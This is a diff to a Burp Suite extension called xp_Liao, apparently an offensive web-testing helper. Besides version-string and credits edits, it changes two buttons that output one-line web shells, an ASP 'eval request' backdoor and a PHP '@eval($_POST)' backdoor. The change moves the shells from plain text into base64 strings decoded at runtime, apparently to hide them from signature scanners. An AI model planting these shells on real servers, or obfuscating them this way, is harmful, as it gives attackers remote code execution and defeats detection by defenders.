@@ -32,7 +32,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         this.stdout.println("hello xia Liao!");
         this.stdout.println("你好 欢迎使用 瞎料!");
-        this.stdout.println("version:1.0");
+        this.stdout.println("version:1.1");
 
         // keep a reference to our callbacks object
         this.callbacks = callbacks;
@@ -41,7 +41,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
         helpers = callbacks.getHelpers();
 
         // set our extension name
-        callbacks.setExtensionName("xp_Liao V1.0");
+        callbacks.setExtensionName("xp_Liao V1.1");
 
         // create our UI
         SwingUtilities.invokeLater(new Runnable()
@@ -148,7 +148,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
                 btn7.addActionListener(new ActionListener() {
                     @Override
                     public void actionPerformed(ActionEvent e) {
-                        area.setText("<%eval request(\"pass\")%>");
+                        area.setText(helpers.bytesToString(helpers.base64Decode("PCVldmFsIHJlcXVlc3QoInBhc3MiKSU+")));
                     }
                 });
                 btn8.addActionListener(new ActionListener() {
@@ -169,7 +169,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
                 btn9.addActionListener(new ActionListener() {
                     @Override
                     public void actionPerformed(ActionEvent e) {
-                        area.setText("<?php @eval($_POST['pass']);?>");
+                        area.setText(helpers.bytesToString(helpers.base64Decode("PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+")));
                     }
                 });
                 btn10.addActionListener(new ActionListener() {
@@ -221,8 +221,8 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener
                 jps.setLayout(new GridLayout(8, 1)); //六行一列
                 JLabel jls=new JLabel("插件名：瞎料 author：算命縖子");    //创建一个标签
                 JLabel jls_1=new JLabel("吐司：www.t00ls.com");
-                JLabel jls_2=new JLabel("版本：xp_Liao V1.0");
-                JLabel jls_3=new JLabel("感谢名单：Shincehor");
+                JLabel jls_2=new JLabel("版本：xp_Liao V1.1");
+                JLabel jls_3=new JLabel("感谢名单：Shinceho、SongS、S");
                 JButton btn1=new JButton("重新生成");
                 JLabel jls_4=new JLabel("");
                 JLabel jls_5=new JLabel("");
